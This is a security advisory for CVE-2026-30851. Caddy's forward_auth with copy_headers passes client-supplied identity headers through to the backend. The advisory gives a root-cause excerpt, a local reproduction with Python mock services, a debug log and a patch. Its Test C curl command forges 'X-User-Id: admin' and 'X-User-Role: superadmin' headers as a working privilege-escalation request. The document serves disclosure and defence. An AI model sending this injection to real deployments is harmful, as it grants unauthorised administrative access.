# Caddy forward_auth copy_headers Does Not Strip Client-Supplied Headers, Allowing Identity Injection and Privilege Escalation

**GHSA**: GHSA-7r4p-vjf4-gxv4 | **CVE**: CVE-2026-30851 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-287, CWE-345

**Affected Packages**:
- **github.com/caddyserver/caddy/v2/modules/caddyhttp/reverseproxy** (go): >= 2.10.0, < 2.11.2

## Description

## Summary

Caddy's `forward_auth` directive with `copy_headers` generates conditional header-set operations that only fire when the upstream auth service includes the named header in its response. No delete or remove operation is generated for the original client-supplied request header with the same name.

When an auth service returns `200 OK` without one of the configured `copy_headers` headers, the client-supplied header passes through unchanged to the backend. Any requester holding a valid authentication token can inject arbitrary values for trusted identity headers, resulting in privilege escalation.

This is a regression introduced by PR #6608 in November 2024. All stable releases from v2.10.0 onward are affected.

---

## Scope Argument

This is a bug in the source code of this repository, not a misconfiguration.

The operator uses `forward_auth` with `copy_headers` exactly as documented. The documentation contains no warning that client-supplied headers with the same names as `copy_headers` entries must also be stripped manually. The `forward_auth` directive is a security primitive whose stated purpose is to gate backend access behind an external auth service. A user of this directive reasonably expects that the backend cannot receive a client-controlled value for a header listed in `copy_headers`.

The bug is traceable to a specific commit: PR #6608 (merged November 4, 2024), which added a `MatchNot` guard to skip the `Set` operation when the auth response header is absent. This change, while fixing a legitimate UX issue (headers being set to empty strings), removed the incidental protection that the previous unconditional `Set` provided. Before PR #6608, setting a header to an empty/unresolved placeholder overwrote the attacker-supplied value. After PR #6608, the attacker's value survives.

The fix is a single-line code change in `modules/caddyhttp/reverseproxy/forwardauth/caddyfile.go`.

---

## Affected Versions

| Version | Vulnerable |
|---|---|
| <= v2.9.x | No (old code overwrote client value with empty placeholder) |
| v2.10.0 (April 18, 2025) | Yes — first stable release containing PR #6608 |
| v2.10.1 | Yes |
| v2.10.2 | Yes |
| v2.11.0 | Yes |
| v2.11.1 (February 23, 2026, current) | Yes — unpatched |

**Package:** `github.com/caddyserver/caddy/v2`
**Affected file:** `modules/caddyhttp/reverseproxy/forwardauth/caddyfile.go`

---

## Root Cause

The `parseCaddyfile` function builds one route per `copy_headers` entry. Each route uses a `MatchNot` guard and a `Set` operation:

```go
// from modules/caddyhttp/reverseproxy/forwardauth/caddyfile.go (v2.11.1, identical in v2.10.x)
copyHeaderRoutes = append(copyHeaderRoutes, caddyhttp.Route{
    MatcherSetsRaw: []caddy.ModuleMap{{
        "not": h.JSON(caddyhttp.MatchNot{MatcherSetsRaw: []caddy.ModuleMap{{
            "vars": h.JSON(caddyhttp.VarsMatcher{
                "{" + placeholderName + "}": []string{""},
            }),
        }}}),
    }},
    HandlersRaw: []json.RawMessage{caddyconfig.JSONModuleObject(
        handler, "handler", "headers", nil,
    )},
})
```

The route runs only when `{http.reverse_proxy.header.X-User-Id}` (the auth service's response header) is non-empty. When the auth service does not return `X-User-Id`, the placeholder is empty, the `MatchNot` guard fires, the route is skipped, and the original client-supplied `X-User-Id` header is never removed.

There is no `Delete` operation anywhere in this function.

---

## Minimal Reproduction Config

**Caddyfile** (no redactions, as required):

```
{
    admin off
    auto_https off
    debug
}

:8080 {
    forward_auth 127.0.0.1:9091 {
        uri /
        copy_headers X-User-Id X-User-Role
    }
    reverse_proxy 127.0.0.1:9092
}
```

---

## Reproduction Steps

No containers, VMs, or external services are used. All services run as local processes.

### Step 1 — Start the auth service

Save as `auth.py` and run `python3 auth.py` in a terminal:

```python
# auth.py
# Accepts any Bearer token, returns 200 OK with NO identity headers.
# Represents a stateless JWT validator that checks signature only.
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        auth = self.headers.get('Authorization', '')
        code = 200 if auth.startswith('Bearer ') else 401
        self.send_response(code)
        self.end_headers()
        sys.stdout.write(f'[auth] {self.command} {self.path} -> {code}\n')
        sys.stdout.flush()
    def log_message(self, *a): pass

HTTPServer(('127.0.0.1', 9091), H).serve_forever()
```

### Step 2 — Start the backend

Save as `backend.py` and run `python3 backend.py` in a second terminal:

```python
# backend.py
# Echoes the identity headers it receives.
import sys, json
from http.server import HTTPServer, BaseHTTPRequestHandler

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        data = {
            'X-User-Id':   self.headers.get('X-User-Id',   '(absent)'),
            'X-User-Role': self.headers.get('X-User-Role', '(absent)'),
        }
        body = json.dumps(data, indent=2).encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        sys.stdout.write(f'[backend] saw: {data}\n')
        sys.stdout.flush()
    def log_message(self, *a): pass

HTTPServer(('127.0.0.1', 9092), H).serve_forever()
```

### Step 3 — Start Caddy

```bash
caddy run --config Caddyfile --adapter caddyfile
```

### Step 4 — Run the three test cases

**Test A: No token — must be blocked (confirms auth is enforced)**

```bash
curl -v http://127.0.0.1:8080/
```

Expected: `HTTP/1.1 401`

---

**Test B: Valid token, no injected headers (baseline)**

```bash
curl -v http://127.0.0.1:8080/ \
  -H "Authorization: Bearer token123"
```

Expected backend response:
```json
{
  "X-User-Id":   "(absent)",
  "X-User-Role": "(absent)"
}
```

---

**Test C: ATTACK — valid token plus injected identity headers**

```bash
curl -v http://127.0.0.1:8080/ \
  -H "Authorization: Bearer token123" \
  -H "X-User-Id: admin" \
  -H "X-User-Role: superadmin"
```

Actual backend response (demonstrates the vulnerability):
```json
{
  "X-User-Id":   "admin",
  "X-User-Role": "superadmin"
}
```

The backend receives the attacker-supplied identity values. The auth service accepted the token (correctly) but did not return `X-User-Id` or `X-User-Role`. Caddy skipped the `Set` operation due to the `MatchNot` guard but never deleted the original headers. The attacker-controlled values survived into the proxied request.

**Test C is the proof of the vulnerability.**

The attack requires only a valid (non-privileged) token. No admin account is needed.

---

## Full Debug Log

Run Caddy with `debug` in the global block (included in the Caddyfile above). The relevant log lines from Test C will show:

```
DEBUG   http.handlers.reverse_proxy     selected upstream  {"dial": "127.0.0.1:9091"}
DEBUG   http.handlers.reverse_proxy     upstream responded  {"status": 200}
DEBUG   http.handlers.reverse_proxy     handling response   {"handler": "copy_headers"}
```

Note that no log line will show a header deletion because no deletion occurs. The `X-User-Id` and `X-User-Role` headers are never touched.

---

## Impact

Any deployment using `forward_auth` with `copy_headers` where the auth service validates credentials without returning identity headers in its response. This is common in:

- Stateless JWT validators (verify signature, no response headers)
- Session validators that leave identity decoding to the backend
- Auth services where only some requests return identity headers

Attack:
1. Attacker has any valid auth token
2. Attacker sends request with forged `X-User-Id: admin` and `X-User-Role: superadmin`
3. Auth service validates token, returns `200 OK`, no identity headers
4. Caddy skips `Set` (placeholder empty), never deletes original headers
5. Backend receives `X-User-Id: admin`, `X-User-Role: superadmin`
6. Backend grants admin access

CVSS v3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` = **8.1 High**

---

## Working Patch

```diff
--- a/modules/caddyhttp/reverseproxy/forwardauth/caddyfile.go
+++ b/modules/caddyhttp/reverseproxy/forwardauth/caddyfile.go
@@ -216,6 +216,25 @@ func parseCaddyfile(h httpcaddyfile.Helper) ([]httpcaddyfile.ConfigValue, error)
 	copyHeaderRoutes := []caddyhttp.Route{}
 	for _, from := range sortedHeadersToCopy {
 		to := http.CanonicalHeaderKey(headersToCopy[from])
 		placeholderName := "http.reverse_proxy.header." + http.CanonicalHeaderKey(from)
+
+		// Security fix: unconditionally delete the client-supplied header
+		// before the conditional set runs. Without this, a client that
+		// pre-supplies a header listed in copy_headers can inject arbitrary
+		// values when the auth service does not return that header, because
+		// the MatchNot guard below skips the Set entirely (leaving the
+		// original client value intact).
+		copyHeaderRoutes = append(copyHeaderRoutes, caddyhttp.Route{
+			HandlersRaw: []json.RawMessage{
+				caddyconfig.JSONModuleObject(
+					&headers.Handler{
+						Request: &headers.HeaderOps{
+							Delete: []string{to},
+						},
+					},
+					"handler", "headers", nil,
+				),
+			},
+		})
+
 		handler := &headers.Handler{
 			Request: &headers.HeaderOps{
 				Set: http.Header{
```

The `delete` route has no matcher, so it always runs. It fires before the existing `MatchNot + Set` route. The client-supplied header is cleared unconditionally. If the auth service provides the header, the subsequent `Set` then applies the correct value. If the auth service does not provide the header, the client's value is gone and the backend receives nothing.

This is a minimal, targeted fix with no impact on existing functionality when the auth service returns the headers.

---

## Uniqueness Confirmation

The following were checked and confirmed not to cover this vulnerability:

- All 6 GHSA advisories published 2026-02-23: GHSA-x76f-jf84-rqj8, GHSA-g7pc-pc7g-h8jh, GHSA-hffm-g8v7-wrv7, GHSA-879p-475x-rqh2, GHSA-4xrr-hq4w-6vf4, GHSA-5r3v-vc8m-m96g
- GitHub issue #7459 (malformed Host header)
- GitHub issue #6610 (template placeholder leakage in copy_headers — fixed by PR #6608, which introduced this regression)
- All Caddy community forum threads on `forward_auth`, `copy_headers`, and header stripping
- CVE-2026-25748 (authentik auth bypass — root cause is in authentik cookie parsing, not Caddy)
- CVE-2024-21494, CVE-2024-21499 (caddy-security third-party plugin, not Caddy core)
- PR #6608 comment thread (no security discussion)
- cvedetails.com Caddy product listing (no matching CVE)

No prior report exists for this specific behavior.

---

## References

- Vulnerable file (v2.11.1): https://github.com/caddyserver/caddy/blob/v2.11.1/modules/caddyhttp/reverseproxy/forwardauth/caddyfile.go
- PR #6608 (introduced regression): https://github.com/caddyserver/caddy/pull/6608
- Issue #6610 (related UX bug, fixed by PR #6608): https://github.com/caddyserver/caddy/issues/6610
- forward_auth documentation: https://caddyserver.com/docs/caddyfile/directives/forward_auth

---

## Fix
Fix PR - https://github.com/caddyserver/caddy/pull/7545

---

## AI Disclosure

An LLM  was used to polish the report.
